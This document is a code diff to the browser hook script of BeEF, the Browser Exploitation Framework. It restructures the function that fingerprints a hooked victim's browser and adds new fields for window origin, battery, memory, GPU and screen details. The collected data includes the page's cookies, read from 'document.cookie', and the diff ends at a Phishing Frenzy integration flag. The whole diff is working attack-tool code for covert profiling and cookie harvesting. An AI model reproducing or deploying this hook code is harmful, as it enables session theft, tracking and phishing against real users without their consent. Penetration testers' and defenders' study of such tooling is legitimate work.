@@ -4214,28 +4214,42 @@ beef.browser = {
         var browser_reported_name = beef.browser.getBrowserReportedName();
         var browser_language = beef.browser.getBrowserLanguage();
         var page_title = (document.title) ? document.title : "Unknown";
+        var origin = (window.origin) ? window.origin : "Unknown";
         var page_uri = (document.location.href) ? document.location.href : "Unknown";
         var page_referrer = (document.referrer) ? document.referrer : "Unknown";
-        var hostname = (document.location.hostname) ? document.location.hostname : "Unknown";
+        var page_hostname = (document.location.hostname) ? document.location.hostname : "Unknown";
+        var default_port = "";
         switch (document.location.protocol) {
         case "http:":
             var default_port = "80";
             break;
         case "https:":
             var default_port = "443";
-            break
-        default:
-            var default_port = "";
+            break;
         }
-        var hostport = (document.location.port) ? document.location.port : default_port;
+        var page_hostport = (document.location.port) ? document.location.port : default_port;
         var browser_plugins = beef.browser.getPlugins();
         var date_stamp = new Date().toString();
         var os_name = beef.os.getName();
         var os_version = beef.os.getVersion();
+        var os_arch = beef.os.getArch();
         var default_browser = beef.os.getDefaultBrowser();
-        var hw_name = beef.hardware.getName();
+        var hw_type = beef.hardware.getName();
+        var battery_details = beef.hardware.getBatteryDetails();
+        try {
+          var battery_charging_status = battery_details.chargingStatus;
+          var battery_level = battery_details.batteryLevel;
+          var battery_charging_time = battery_details.chargingTime;
+          var battery_discharging_time = battery_details.dischargingTime;
+        } catch(e) {}
+        var memory = beef.hardware.getMemory();
         var cpu_arch = beef.hardware.getCpuArch();
         var cpu_cores = beef.hardware.getCpuCores();
+        var gpu_details = beef.hardware.getGpuDetails();
+        try {
+          var gpu = gpu_details.gpu;
+          var gpu_vendor = gpu_details.vendor;
+        } catch(e) {}
         var touch_enabled = (beef.hardware.isTouchEnabled()) ? "Yes" : "No";
         var browser_platform = (typeof(navigator.platform) != "undefined" && navigator.platform != "") ? navigator.platform : 'Unknown';
         var browser_type = JSON.stringify(beef.browser.type(), function (key, value) {
@@ -4244,7 +4258,16 @@ beef.browser = {
             else return undefined;
         });
         var screen_size = beef.hardware.getScreenSize();
+        try {
+          var screen_width = screen_size.width;
+          var screen_height = screen_size.height;
+          var screen_colordepth = screen_size.colordepth;
+        } catch(e) {}
         var window_size = beef.browser.getWindowSize();
+        try {
+          window_width = window_size.width;
+          window_height = window_size.height;
+        } catch(e) {}
         var vbscript_enabled = (beef.browser.hasVBScript()) ? "Yes" : "No";
         var has_flash = (beef.browser.hasFlash()) ? "Yes" : "No";
         var has_phonegap = (beef.browser.hasPhonegap()) ? "Yes" : "No";
@@ -4257,50 +4280,72 @@ beef.browser = {
         var has_quicktime = (beef.browser.hasQuickTime()) ? "Yes" : "No";
         var has_realplayer = (beef.browser.hasRealPlayer()) ? "Yes" : "No";
         var has_wmp = (beef.browser.hasWMP()) ? "Yes" : "No";
+        var has_vlc = (beef.browser.hasVLC()) ? "Yes" : "No";
+
         try {
             var cookies = document.cookie;
             /* Never stop the madness dear C.
              * var veglol = beef.browser.cookie.veganLol();
              */
-            if (cookies) details['Cookies'] = cookies;
+            if (cookies) details['browser.window.cookies'] = cookies;
         } catch (e) {
-            details['Cookies'] = "Cookies can't be read. The hooked origin is most probably using HttpOnly.";
+            beef.debug("Cookies can't be read. The hooked origin is most probably using HttpOnly.");
+            details['browser.window.cookies'] = '';
         }
 
-        if (browser_name) details['BrowserName'] = browser_name;
-        if (browser_version) details['BrowserVersion'] = browser_version;
-        if (browser_reported_name) details['BrowserReportedName'] = browser_reported_name;
-        if (browser_language) details['BrowserLanguage'] = browser_language;
-        if (page_title) details['PageTitle'] = page_title;
-        if (page_uri) details['PageURI'] = page_uri;
-        if (page_referrer) details['PageReferrer'] = page_referrer;
-        if (hostname) details['HostName'] = hostname;
-        if (hostport) details['HostPort'] = hostport;
-        if (browser_plugins) details['BrowserPlugins'] = browser_plugins;
-        if (os_name) details['OsName'] = os_name;
-        if (os_version) details['OsVersion'] = os_version;
-        if (default_browser) details['DefaultBrowser'] = default_browser;
-        if (hw_name) details['Hardware'] = hw_name;
-        if (cpu_arch) details['CpuArch'] = cpu_arch;
-        if (cpu_cores) details['CpuCores'] = cpu_cores;
-        if (touch_enabled) details['TouchEnabled'] = touch_enabled;
-        if (date_stamp) details['DateStamp'] = date_stamp;
-        if (browser_platform) details['BrowserPlatform'] = browser_platform;
-        if (browser_type) details['BrowserType'] = browser_type;
-        if (screen_size) details['ScreenSize'] = screen_size;
-        if (window_size) details['WindowSize'] = window_size;
-        if (vbscript_enabled) details['VBScriptEnabled'] = vbscript_enabled;
-        if (has_flash) details['HasFlash'] = has_flash;
-        if (has_phonegap) details['HasPhonegap'] = has_phonegap;
-        if (has_web_socket) details['HasWebSocket'] = has_web_socket;
-        if (has_web_worker) details['HasWebWorker'] = has_web_worker;
-        if (has_web_gl) details['HasWebGL'] = has_web_gl;
-        if (has_googlegears) details['HasGoogleGears'] = has_googlegears;
-        if (has_webrtc) details['HasWebRTC'] = has_webrtc;
-        if (has_activex) details['HasActiveX'] = has_activex;
-        if (has_quicktime) details['HasQuickTime'] = has_quicktime;
-        if (has_realplayer) details['HasRealPlayer'] = has_realplayer;
-        if (has_wmp) details['HasWMP'] = has_wmp;
+        if (browser_type) details['browser.type'] = browser_type;
+        if (browser_name) details['browser.name'] = browser_name;
+        if (browser_version) details['browser.version'] = browser_version;
+        if (browser_reported_name) details['browser.name.reported'] = browser_reported_name;
+        if (browser_platform) details['browser.platform'] = browser_platform;
+        if (browser_language) details['browser.language'] = browser_language;
+        if (page_title) details['browser.window.title'] = page_title;
+        if (origin) details['browser.window.origin'] = origin;
+        if (page_hostname) details['browser.window.hostname'] = page_hostname;
+        if (page_hostport) details['browser.window.hostport'] = page_hostport;
+        if (page_uri) details['browser.window.uri'] = page_uri;
+        if (page_referrer) details['browser.window.referrer'] = page_referrer;
+        if (window_width) details['browser.window.size.width'] = window_width;
+        if (window_height) details['browser.window.size.height'] = window_height;
+        if (browser_plugins) details['browser.plugins'] = browser_plugins;
+        if (date_stamp) details['browser.date.datestamp'] = date_stamp;
+
+        if (os_name) details['host.os.name'] = os_name;
+        if (os_version) details['host.os.version'] = os_version;
+        if (os_arch) details['host.os.arch'] = os_arch;
+
+        if (default_browser) details['host.software.defaultbrowser'] = default_browser;
+
+        if (hw_type) details['hardware.type'] = hw_type;
+        if (memory) details['hardware.memory'] = memory;
+        if (gpu) details['hardware.gpu'] = gpu;
+        if (gpu_vendor) details['hardware.gpu.vendor'] = gpu_vendor;
+        if (cpu_arch) details['hardware.cpu.arch'] = cpu_arch;
+        if (cpu_cores) details['hardware.cpu.cores'] = cpu_cores;
+
+        if (battery_charging_status) details['hardware.battery.chargingstatus'] = battery_charging_status;
+        if (battery_level) details['hardware.battery.level'] = battery_level;
+        if (battery_charging_time) details['hardware.battery.chargingtime'] = battery_charging_time;
+        if (battery_discharging_time) details['hardware.battery.dischargingtime'] = battery_discharging_time;
+
+        if (screen_width) details['hardware.screen.size.width'] = screen_width;
+        if (screen_height) details['hardware.screen.size.height'] = screen_height;
+        if (screen_colordepth) details['hardware.screen.colordepth'] = screen_colordepth;
+        if (touch_enabled) details['hardware.screen.touchenabled'] = touch_enabled;
+
+        if (vbscript_enabled) details['browser.capabilities.vbscript'] = vbscript_enabled;
+        if (has_flash) details['browser.capabilities.flash'] = has_flash;
+        if (has_phonegap) details['browser.capabilities.phonegap'] = has_phonegap;
+        if (has_web_socket) details['browser.capabilities.websocket'] = has_web_socket;
+        if (has_webrtc) details['browser.capabilities.webrtc'] = has_webrtc;
+        if (has_web_worker) details['browser.capabilities.webworker'] = has_web_worker;
+        if (has_web_gl) details['browser.capabilities.webgl'] = has_web_gl;
+        if (has_googlegears) details['browser.capabilities.googlegears'] = has_googlegears;
+        if (has_activex) details['browser.capabilities.activex'] = has_activex;
+        if (has_quicktime) details['browser.capabilities.quicktime'] = has_quicktime;
+        if (has_realplayer) details['browser.capabilities.realplayer'] = has_realplayer;
+        if (has_wmp) details['browser.capabilities.wmp'] = has_wmp;
+        if (has_vlc) details['browser.capabilities.vlc'] = has_vlc;
 
         var pf_integration = "<%= @phishing_frenzy_enable %>";
         if (pf_integration) {
